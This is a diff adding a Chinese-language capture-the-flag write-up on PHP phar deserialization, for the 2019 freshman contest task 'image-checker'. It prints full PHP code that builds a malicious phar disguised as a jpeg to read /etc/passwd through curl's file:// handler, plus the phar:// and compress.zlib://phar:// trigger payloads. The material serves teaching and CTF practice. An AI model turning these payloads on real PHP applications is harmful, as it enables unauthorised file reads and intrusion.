@@ -428,3 +428,40 @@ system("mv asdf.phar asdf.gif");
 得到的md5为`337def6af3af5b39784016d8a5e06f8c`,最终的文件名为`337def6af3af5b39784016d8a5e06f8c.jpg`
 
 payload`file.php?file=phar://upload/337def6af3af5b39784016d8a5e06f8c.jpg`
+
+---
+
+例题 2019年新生赛 image-checker
+
+从`class.php`可以得知存在`curl_exec`,可以使用`file://`协议来进行文件读取
+
+从题目主页面和`imagesize.php`文件名推测其使用了`getimagesize`函数,可以利用phar反序列漏洞
+
+题目要生成的phar文件
+
+```php
+<?php
+class CurlClass
+{
+}
+class MainClass
+{
+    public function __construct($path)
+    {
+        $this->call = "httpGet";
+        $this->arg = "file://" . $path;
+    }
+}
+$phar = new Phar("asdf.phar"); //后缀名必须为phar
+$phar->startBuffering();
+$phar->setStub("<?php __HALT_COMPILER(); ?>"); //设置存根stub
+$test = new MainClass('/etc/passwd');
+$test->name = 'asdfgh';
+$phar->setMetadata($test); //将自定义的meta-data序列化后存入manifest
+$phar->addFromString("test.jpeg", "asdfghjkl"); //phar本质上是对文件的压缩所以要添加要压缩的文件
+$phar->stopBuffering();
+```
+
+将phar文件修改为jpeg文件,上传即可
+
+在check image size中传入`compress.zlib://phar://uploads/487dfa0355.jpeg/test.jpeg`即可
